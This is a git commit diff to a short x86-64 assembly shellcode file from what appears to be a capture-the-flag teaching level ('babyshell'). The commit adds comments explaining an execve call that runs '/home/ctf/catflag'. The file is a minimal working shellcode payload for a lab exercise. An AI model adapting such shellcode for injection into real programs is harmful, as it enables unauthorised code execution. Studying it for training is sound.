3c3bc5dc4c58e9e7c5192ee13da12a4d08e78821
Xohan30 <48544502+xohan30@users.noreply.github.com>
2021-05-01 01:39:13 +0530

    Update shellcode.s

--- babyshell/level1_teaching1/shellcode.s
+++ babyshell/level1_teaching1/shellcode.s
@@ -1,10 +1,12 @@
+# written by xohan30
+
 .global _start
 _start:
 .intel_syntax noprefix
-        mov rax, 59
-        lea rdi, [rip+flag]
-        mov rsi, 0
-        mov rdx, 0
-        syscall
+        mov rax, 59             # execv syscall no
+        lea rdi, [rip+flag]     # loading the flag variable into memory
+        mov rsi, 0              # null arg
+        mov rdx, 0              # null arg
+        syscall                 # syscall
 flag:
-        .string "/home/ctf/catflag"
+        .string "/home/ctf/catflag" # command to be executed
